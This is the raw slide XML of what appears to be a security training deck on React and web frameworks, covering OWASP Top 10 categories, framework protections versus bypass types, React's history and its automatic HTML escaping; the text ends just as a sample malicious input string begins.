                        <a:rPr lang="en-US" dirty="0"/>
                        <a:t>XML</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="en-US" baseline="0" dirty="0"/>
                        <a:t> External Entities</a:t>
                      </a:r>
                      <a:endParaRPr lang="en-US" dirty="0"/>
                    </a:p>
                  </a:txBody>
                  <a:tcPr/>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:endParaRPr lang="en-US" dirty="0"/>
                    </a:p>
                  </a:txBody>
                  <a:tcPr/>
                </a:tc>
                <a:extLst>
                  <a:ext uri="{0D108BD9-81ED-4DB2-BD59-A6C34878D82A}">
                    <a16:rowId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" val="10004"/>
                  </a:ext>
                </a:extLst>
              </a:tr>
              <a:tr h="370840">
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr lang="en-US" dirty="0"/>
                        <a:t>Broken Access Control</a:t>
                      </a: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Security</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="en-US" baseline="0" dirty="0"/>
                        <a:t> Misconfiguration</a:t>
                      </a:r>
                      <a:endParaRPr lang="en-US" dirty="0"/>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Cross-Site Scripting</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Insecure</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="en-US" baseline="0" dirty="0"/>
                        <a:t> Deserialization</a:t>
                      </a:r>
                      <a:endParaRPr lang="en-US" dirty="0"/>
                    </a:p>
                  </a:txBody>
                  <a:tcPr/>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:endParaRPr lang="en-US" dirty="0"/>
                    </a:p>
                  </a:txBody>
                  <a:tcPr/>
                </a:tc>
                <a:extLst>
                  <a:ext uri="{0D108BD9-81ED-4DB2-BD59-A6C34878D82A}">
                    <a16:rowId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" val="100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components with Known Vulnerabilities</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr/>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:endParaRPr lang="en-US" dirty="0"/>
                    </a:p>
                  </a:txBody>
                  <a:tcPr/>
                </a:tc>
                <a:extLst>
                  <a:ext uri="{0D108BD9-81ED-4DB2-BD59-A6C34878D82A}">
                    <a16:rowId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" val="100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Insufficient Logging &amp; Monitoring</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr/>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:endParaRPr lang="en-US" dirty="0"/>
                    </a:p>
                  </a:txBody>
                  <a:tcPr/>
                </a:tc>
                <a:extLst>
                  <a:ext uri="{0D108BD9-81ED-4DB2-BD59-A6C34878D82A}">
                    <a16:rowId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" val="10010"/>
                  </a:ext>
                </a:extLst>
              </a:tr>
            </a:tbl>
          </a:graphicData>
        </a:graphic>
      </p:graphicFrame>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6168" y="3155293"/>
            <a:ext cx="514043" cy="365760"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>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0635" y="2432775"/>
            <a:ext cx="514043" cy="365760"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>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6168" y="2789523"/>
            <a:ext cx="514043" cy="365760"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="8" name="Picture 7"/>
          <p:cNvPicPr>
            <a:picLocks noChangeAspect="1"/>
          </p:cNvPicPr>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill rotWithShape="1">
          <a:blip r:embed="rId4" cstate="print">
            <a:extLst>
              <a:ext uri="{28A0092B-C50C-407E-A947-70E740481C1C}">
                <a14:useLocalDpi xmlns:a14="http://schemas.microsoft.com/office/drawing/2010/main" val="0"/>
              </a:ext>
            </a:extLst>
          </a:blip>
          <a:srcRect l="25794" t="19319" r="67063" b="21833"/>
          <a:stretch/>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="8353307" y="3521063"/>
            <a:ext cx="519765" cy="365760"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>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6168" y="3886833"/>
            <a:ext cx="514043" cy="365760"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="10" name="Picture 9"/>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6168" y="4252603"/>
            <a:ext cx="514043" cy="365760"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>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6168" y="4618373"/>
            <a:ext cx="514043" cy="365760"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
      <p:grpSp>
        <p:nvGrpSpPr>
          <p:cNvPr id="12" name="Group 11"/>
          <p:cNvGrpSpPr/>
          <p:nvPr/>
        </p:nvGrpSpPr>
        <p:grpSpPr>
          <a:xfrm>
            <a:off x="8442309" y="4984143"/>
            <a:ext cx="341760" cy="400110"/>
            <a:chOff x="10505943" y="3466958"/>
            <a:chExt cx="341760" cy="400110"/>
          </a:xfrm>
        </p:grpSpPr>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="13" name="TextBox 12"/>
            <p:cNvSpPr txBox="1"/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="10505943" y="3466958"/>
              <a:ext cx="341760" cy="400110"/>
            </a:xfrm>
            <a:prstGeom prst="rect">
              <a:avLst/>
            </a:prstGeom>
            <a:noFill/>
          </p:spPr>
          <p:txBody>
            <a:bodyPr wrap="none" rtlCol="0">
              <a:spAutoFit/>
            </a:bodyPr>
            <a:lstStyle/>
            <a:p>
              <a:r>
                <a:rPr lang="en-US" sz="2000" b="1" dirty="0">
                  <a:solidFill>
                    <a:schemeClr val="accent1"/>
                  </a:solidFill>
                </a:rPr>
                <a:t>?</a:t>
              </a:r>
            </a:p>
          </p:txBody>
        </p:sp>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="14" name="Rectangle 13"/>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="10539663" y="3532131"/>
              <a:ext cx="274320" cy="27432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p:cNvPicPr>
            <a:picLocks noChangeAspect="1"/>
          </p:cNvPicPr>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill rotWithShape="1">
          <a:blip r:embed="rId3" cstate="print">
            <a:extLst>
              <a:ext uri="{28A0092B-C50C-407E-A947-70E740481C1C}">
                <a14:useLocalDpi xmlns:a14="http://schemas.microsoft.com/office/drawing/2010/main" val="0"/>
              </a:ext>
            </a:extLst>
          </a:blip>
          <a:srcRect l="8995" t="18721" r="84127" b="23980"/>
          <a:stretch/>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="8356168" y="5384263"/>
            <a:ext cx="514043" cy="365760"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
      <p:grpSp>
        <p:nvGrpSpPr>
          <p:cNvPr id="17" name="Group 16"/>
          <p:cNvGrpSpPr/>
          <p:nvPr/>
        </p:nvGrpSpPr>
        <p:grpSpPr>
          <a:xfrm>
            <a:off x="8436776" y="5750542"/>
            <a:ext cx="341760" cy="400110"/>
            <a:chOff x="10505943" y="3466958"/>
            <a:chExt cx="341760" cy="400110"/>
          </a:xfrm>
        </p:grpSpPr>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="18" name="TextBox 17"/>
            <p:cNvSpPr txBox="1"/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="10505943" y="3466958"/>
              <a:ext cx="341760" cy="400110"/>
            </a:xfrm>
            <a:prstGeom prst="rect">
              <a:avLst/>
            </a:prstGeom>
            <a:noFill/>
          </p:spPr>
          <p:txBody>
            <a:bodyPr wrap="none" rtlCol="0">
              <a:spAutoFit/>
            </a:bodyPr>
            <a:lstStyle/>
            <a:p>
              <a:r>
                <a:rPr lang="en-US" sz="2000" b="1" dirty="0">
                  <a:solidFill>
                    <a:schemeClr val="accent1"/>
                  </a:solidFill>
                </a:rPr>
                <a:t>?</a:t>
              </a:r>
            </a:p>
          </p:txBody>
        </p:sp>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="19" name="Rectangle 18"/>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="10539663" y="3532131"/>
              <a:ext cx="274320" cy="27432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8744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Frameworks Security</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:graphicFrame>
        <p:nvGraphicFramePr>
          <p:cNvPr id="4" name="Table 3"/>
          <p:cNvGraphicFramePr>
            <a:graphicFrameLocks noGrp="1"/>
          </p:cNvGraphicFramePr>
          <p:nvPr>
            <p:extLst>
              <p:ext uri="{D42A27DB-BD31-4B8C-83A1-F6EECF244321}">
                <p14:modId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="3863372338"/>
              </p:ext>
            </p:extLst>
          </p:nvPr>
        </p:nvGraphicFramePr>
        <p:xfrm>
          <a:off x="1820672" y="1579202"/>
          <a:ext cx="8550656" cy="3874736"/>
        </p:xfrm>
        <a:graphic>
          <a:graphicData uri="http://schemas.openxmlformats.org/drawingml/2006/table">
            <a:tbl>
              <a:tblPr firstRow="1" bandRow="1">
                <a:tableStyleId>{5C22544A-7EE6-4342-B048-85BDC9FD1C3A}</a:tableStyleId>
              </a:tblPr>
              <a:tblGrid>
                <a:gridCol w="4275328">
                  <a:extLst>
                    <a:ext uri="{9D8B030D-6E8A-4147-A177-3AD203B41FA5}">
                      <a16:colId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" val="3340413873"/>
                    </a:ext>
                  </a:extLst>
                </a:gridCol>
                <a:gridCol w="4275328">
                  <a:extLst>
                    <a:ext uri="{9D8B030D-6E8A-4147-A177-3AD203B41FA5}">
                      <a16:colId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" val="2341601385"/>
                    </a:ext>
                  </a:extLst>
                </a:gridCol>
              </a:tblGrid>
              <a:tr h="430496">
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr lang="en-US" sz="2000" dirty="0"/>
                        <a:t>Built-in security features</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr/>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr lang="en-US" sz="2000" dirty="0"/>
                        <a:t>Frameworks insecurities</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr/>
                </a:tc>
                <a:extLst>
                  <a:ext uri="{0D108BD9-81ED-4DB2-BD59-A6C34878D82A}">
                    <a16:rowId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" val="4258492060"/>
                  </a:ext>
                </a:extLst>
              </a:tr>
              <a:tr h="2653742">
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:pPr lvl="1"/>
                      <a:r>
                        <a:rPr lang="en-US" sz="2000" dirty="0"/>
                        <a:t>Contextual encoding and templating engines</a:t>
                      </a:r>
                    </a:p>
                    <a:p>
                      <a:pPr lvl="1"/>
                      <a:endParaRPr lang="en-US" sz="2000" dirty="0"/>
                    </a:p>
                    <a:p>
                      <a:pPr lvl="1"/>
                      <a:r>
                        <a:rPr lang="en-US" sz="2000" dirty="0"/>
                        <a:t>CSRF protection – client-side part</a:t>
                      </a:r>
                    </a:p>
                    <a:p>
                      <a:pPr lvl="1"/>
                      <a:endParaRPr lang="en-US" sz="2000" dirty="0"/>
                    </a:p>
                    <a:p>
                      <a:pPr lvl="1"/>
                      <a:r>
                        <a:rPr lang="en-US" sz="2000" dirty="0"/>
                        <a:t>Type checking</a:t>
                      </a:r>
                    </a:p>
                    <a:p>
                      <a:pPr lvl="1"/>
                      <a:endParaRPr lang="en-US" sz="2000" dirty="0"/>
                    </a:p>
                    <a:p>
                      <a:pPr lvl="1"/>
                      <a:r>
                        <a:rPr lang="en-US" sz="2000" dirty="0"/>
                        <a:t>Sandbox (not a security feature)</a:t>
                      </a:r>
                    </a:p>
                    <a:p>
                      <a:pPr lvl="1"/>
                      <a:endParaRPr lang="en-US" sz="2000" dirty="0"/>
                    </a:p>
                    <a:p>
                      <a:pPr lvl="1"/>
                      <a:r>
                        <a:rPr lang="en-US" sz="2000" dirty="0"/>
                        <a:t>Whitelists (for resources, etc.)</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr/>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:pPr lvl="1"/>
                      <a:r>
                        <a:rPr lang="en-US" sz="2000" dirty="0"/>
                        <a:t>Expression injection</a:t>
                      </a:r>
                    </a:p>
                    <a:p>
                      <a:pPr lvl="1"/>
                      <a:endParaRPr lang="en-US" sz="2000" dirty="0"/>
                    </a:p>
                    <a:p>
                      <a:pPr lvl="1"/>
                      <a:r>
                        <a:rPr lang="en-US" sz="2000" dirty="0"/>
                        <a:t>Sandbox bypasses</a:t>
                      </a:r>
                    </a:p>
                    <a:p>
                      <a:pPr lvl="1"/>
                      <a:endParaRPr lang="en-US" sz="2000" dirty="0"/>
                    </a:p>
                    <a:p>
                      <a:pPr lvl="1"/>
                      <a:r>
                        <a:rPr lang="en-US" sz="2000" dirty="0"/>
                        <a:t>Insecure APIs</a:t>
                      </a:r>
                    </a:p>
                    <a:p>
                      <a:pPr lvl="1"/>
                      <a:endParaRPr lang="en-US" sz="2000" dirty="0"/>
                    </a:p>
                    <a:p>
                      <a:pPr lvl="1"/>
                      <a:r>
                        <a:rPr lang="en-US" sz="2000" dirty="0"/>
                        <a:t>CSP bypasses</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr/>
                </a:tc>
                <a:extLst>
                  <a:ext uri="{0D108BD9-81ED-4DB2-BD59-A6C34878D82A}">
                    <a16:rowId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" val="1877563465"/>
                  </a:ext>
                </a:extLst>
              </a:tr>
            </a:tbl>
          </a:graphicData>
        </a:graphic>
      </p:graphicFrame>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="201572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React</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="1507443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Why React?</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="6" name="Rectangle 5"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3466905" y="6144157"/>
            <a:ext cx="5219896" cy="369332"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>https://npmcharts.com/compare/react,vue,angular</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27478" y="1295932"/>
            <a:ext cx="10737044" cy="4848225"/>
          </a:xfrm>
        </p:spPr>
      </p:pic>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="4127340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History</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Content Placeholder 2"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>React was introduced in May 2013</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>In 2013 AngularJS was super popular</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>New features:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>One-way binding &gt; unidirectional flow &gt; scalability</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>JSX</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Virtual DOM</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Angular 2 is announced – Sept 2014</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Angular 2 is released in 2016</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>React is backed by Facebook</a:t>
            </a:r>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199" y="991441"/>
            <a:ext cx="5902463" cy="4173226"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="2064943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Overview</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Content Placeholder 2"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="609600" y="2327478"/>
            <a:ext cx="5429693" cy="2797415"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr>
            <a:normAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0"/>
              <a:t>Framework or Library </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0"/>
              <a:t>Not opinionated</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0"/>
              <a:t>Agnostic about concerns like routing and state management</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0"/>
              <a:t>Vibrant and diverse ecosystem</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0"/>
              <a:t>Functional programming principles</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="TextBox 3"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5167422" y="1708814"/>
            <a:ext cx="6713697" cy="461665"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="none" rtlCol="0">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="2400" i="1" dirty="0"/>
              <a:t>"a JavaScript library for building user interfaces“</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:graphicFrame>
        <p:nvGraphicFramePr>
          <p:cNvPr id="5" name="Table 4"/>
          <p:cNvGraphicFramePr>
            <a:graphicFrameLocks noGrp="1"/>
          </p:cNvGraphicFramePr>
          <p:nvPr>
            <p:extLst>
              <p:ext uri="{D42A27DB-BD31-4B8C-83A1-F6EECF244321}">
                <p14:modId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="1151509964"/>
              </p:ext>
            </p:extLst>
          </p:nvPr>
        </p:nvGraphicFramePr>
        <p:xfrm>
          <a:off x="7184572" y="2327478"/>
          <a:ext cx="4522376" cy="2029744"/>
        </p:xfrm>
        <a:graphic>
          <a:graphicData uri="http://schemas.openxmlformats.org/drawingml/2006/table">
            <a:tbl>
              <a:tblPr/>
              <a:tblGrid>
                <a:gridCol w="4522376">
                  <a:extLst>
                    <a:ext uri="{9D8B030D-6E8A-4147-A177-3AD203B41FA5}">
                      <a16:colId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" val="866628668"/>
                    </a:ext>
                  </a:extLst>
                </a:gridCol>
              </a:tblGrid>
              <a:tr h="862678">
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr lang="en-US" sz="1600" b="0" dirty="0">
                          <a:solidFill>
                            <a:srgbClr val="0000FF"/>
                          </a:solidFill>
                          <a:effectLst/>
                          <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
                        </a:rPr>
                        <a:t>function</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="en-US" sz="1600" b="0" dirty="0">
                          <a:effectLst/>
                          <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
                        </a:rPr>
                        <a:t> Square</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props</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&lt;</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="en-US" sz="1600" b="0" dirty="0">
                          <a:effectLst/>
                          <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
                        </a:rPr>
                        <a:t>button </a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="en-US" sz="1600" b="0" dirty="0" err="1">
                          <a:effectLst/>
                          <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
                        </a:rPr>
                        <a:t>className</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"square"</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="en-US" sz="1600" b="0" dirty="0">
                          <a:effectLst/>
                          <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
                        </a:rPr>
                        <a:t> </a:t>
                      </a:r>
                    </a:p>
                    <a:p>
                      <a:r>
                        <a:rPr lang="en-US" sz="1600" b="0" dirty="0">
                          <a:effectLst/>
                          <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
                        </a:rPr>
                        <a:t>            </a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="en-US" sz="1600" b="0" dirty="0" err="1">
                          <a:effectLst/>
                          <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
                        </a:rPr>
                        <a:t>onClick</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props</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onClick</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props</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value</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&lt;/</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="en-US" sz="1600" b="0" dirty="0">
                          <a:effectLst/>
                          <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
                        </a:rPr>
                        <a:t>button</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="en-US" sz="1600" b="0" dirty="0">
                          <a:solidFill>
                            <a:srgbClr val="777777"/>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3614659446"/>
                  </a:ext>
                </a:extLst>
              </a:tr>
            </a:tbl>
          </a:graphicData>
        </a:graphic>
      </p:graphicFrame>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="4279338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Scripting</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Content Placeholder 2"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="758455" y="1414464"/>
            <a:ext cx="10972800" cy="541927"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr>
            <a:noAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>React automatically escapes HTML code in different contexts</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:graphicFrame>
        <p:nvGraphicFramePr>
          <p:cNvPr id="6" name="Table 5"/>
          <p:cNvGraphicFramePr>
            <a:graphicFrameLocks noGrp="1"/>
          </p:cNvGraphicFramePr>
          <p:nvPr>
            <p:extLst>
              <p:ext uri="{D42A27DB-BD31-4B8C-83A1-F6EECF244321}">
                <p14:modId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="4232528480"/>
              </p:ext>
            </p:extLst>
          </p:nvPr>
        </p:nvGraphicFramePr>
        <p:xfrm>
          <a:off x="2059222" y="1913861"/>
          <a:ext cx="8073556" cy="2407920"/>
        </p:xfrm>
        <a:graphic>
          <a:graphicData uri="http://schemas.openxmlformats.org/drawingml/2006/table">
            <a:tbl>
              <a:tblPr/>
              <a:tblGrid>
                <a:gridCol w="8073556">
                  <a:extLst>
                    <a:ext uri="{9D8B030D-6E8A-4147-A177-3AD203B41FA5}">
                      <a16:colId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" val="20000"/>
                    </a:ext>
                  </a:extLst>
                </a:gridCol>
              </a:tblGrid>
              <a:tr h="2136795">
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr lang="en-US" sz="1900" b="0" i="0" dirty="0" err="1">
                          <a:solidFill>
                            <a:srgbClr val="0000FF"/>
                          </a:solidFill>
                          <a:effectLst/>
                          <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
                        </a:rPr>
                        <a:t>const</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="en-US" sz="1900" b="0" i="0" dirty="0">
                          <a:solidFill>
                            <a:srgbClr val="000000"/>
                          </a:solidFill>
                          <a:effectLst/>
                          <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
                        </a:rPr>
                        <a:t> </a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="en-US" sz="1900" b="0" i="0" dirty="0" err="1">
                          <a:solidFill>
                            <a:srgbClr val="000000"/>
                          </a:solidFill>
                          <a:effectLst/>
                          <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
                        </a:rPr>
                        <a:t>maliciousUserInput</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="en-US" sz="1900" b="0" i="0" dirty="0">
                          <a:solidFill>
                            <a:srgbClr val="000000"/>
                          </a:solidFill>
                          <a:effectLst/>
                          <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
                        </a:rPr>
                        <a:t> </a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="en-US" sz="1900" b="0" i="0" dirty="0">
                          <a:solidFill>
                            <a:srgbClr val="777777"/>
                          </a:solidFill>
                          <a:effectLst/>
                          <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
                        </a:rPr>
                        <a:t>=</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="en-US" sz="1900" b="0" i="0" dirty="0">
                          <a:solidFill>
                            <a:srgbClr val="000000"/>
                          </a:solidFill>
                          <a:effectLst/>
                          <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
                        </a:rPr>
                        <a:t> '</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="en-US" sz="1900" b="0" i="0" dirty="0">
                          <a:solidFill>
                            <a:srgbClr val="777777"/>
                          </a:solidFill>
                          <a:effectLst/>
                          <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
                        </a:rPr>
                        <a:t>&lt;</a:t>
                      </a:r>
                      <a:r>
